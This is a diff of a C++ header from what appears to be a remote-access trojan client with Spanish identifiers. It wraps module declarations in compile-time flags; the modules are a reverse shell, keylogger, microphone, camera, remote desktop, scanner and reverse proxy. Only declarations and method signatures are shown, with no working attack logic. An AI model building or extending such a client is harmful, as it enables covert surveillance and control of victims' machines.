@@ -38,7 +38,10 @@ struct Archivo_Descarga {
 	~Archivo_Descarga() = default;
 };
 
+#ifdef __MOD_SHELL
 class ReverseShell;
+#endif
+
 class Mod_Mic;
 
 class Cliente {
@@ -58,23 +61,41 @@ class Cliente {
 		void Init_Key();
 
 		//Modulos
+#ifdef __MOD_SHELL
 		ReverseShell*      reverseSHELL     = nullptr;
+#endif
+
+#ifdef __MOD_MIC
 		Mod_Mic*           mod_Mic          = nullptr;
+#endif
+
+#ifdef __MOD_KEY
 		mod_Keylogger*     mod_Key          = nullptr;
+#endif
 
 #ifdef __MOD_CAM
 		mod_Camera*        mod_Cam          = nullptr;
 #endif
+
+#ifdef __MOD_RD
 		mod_RemoteDesktop* mod_RemoteDesk   = nullptr;
+#endif
+
+#ifdef __MOD_WM
 		mod_AdminVentanas* mod_AdminVen     = nullptr;
+#endif
+
+#ifdef __MOD_INFO
 		mod_Info*          mod_Inf0         = nullptr;
+#endif
 
 #ifdef __MOD_SCAN
 		mod_Escaner*       mod_Scan         = nullptr;
 #endif
 
+#ifdef __MOD_F
 		modFun*            mod_Fun          = nullptr;
-
+#endif
 		//Funcion para comprobar  que mods estan habilitados
 		void CheckMyMods();
 		
@@ -101,8 +122,11 @@ class Cliente {
 		~Cliente();
 		
 		DynamicLoad* mod_dynamic       = nullptr;
+
+#ifdef __MOD_RP
 		ReverseProxy* mod_ReverseProxy = nullptr;
-		
+#endif
+
 		//Misc
 		std::string ObtenerDesk();
 		std::string ObtenerDown();
@@ -168,6 +192,7 @@ class Cliente {
 		}
 };
 
+#ifdef __MOD_SHELL
 class ReverseShell {
 	private:
 		std::mutex mutex_shell;
@@ -185,5 +210,6 @@ class ReverseShell {
 		void thEscribirShell(std::string pStrInput);
 		void thLeerShell(HANDLE hPipe);
 };
+#endif
 
 #endif
